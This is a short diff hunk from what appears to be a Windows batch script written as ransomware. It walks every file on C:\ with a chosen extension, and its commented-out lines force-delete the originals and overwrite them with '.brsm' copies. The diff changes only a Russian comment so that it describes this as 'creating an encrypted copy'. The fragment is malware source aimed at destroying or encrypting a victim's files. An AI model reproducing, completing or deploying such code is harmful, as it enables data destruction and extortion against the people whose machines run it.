@@ -25,7 +25,7 @@ for /r "C:\" %%i in (*%fileExtension%) do (
 			::echo "%%i.brsm"
 			::del /F /Q  "%%i" >nul	
 			set /a cnt+=1
-			rem альтернатива - перезапись файла, требуется ("%username%".*M) вместо ("%username%".*F) на 20-й строке 
+			rem альтернатива - создание зашифрованной копии, требуется ("%username%".*M) вместо ("%username%".*F) на 20-й строке 
 			::copy /Y "%%i.brsm" "%%i"
 			::del /F /Q "%%i.brsm"
 			
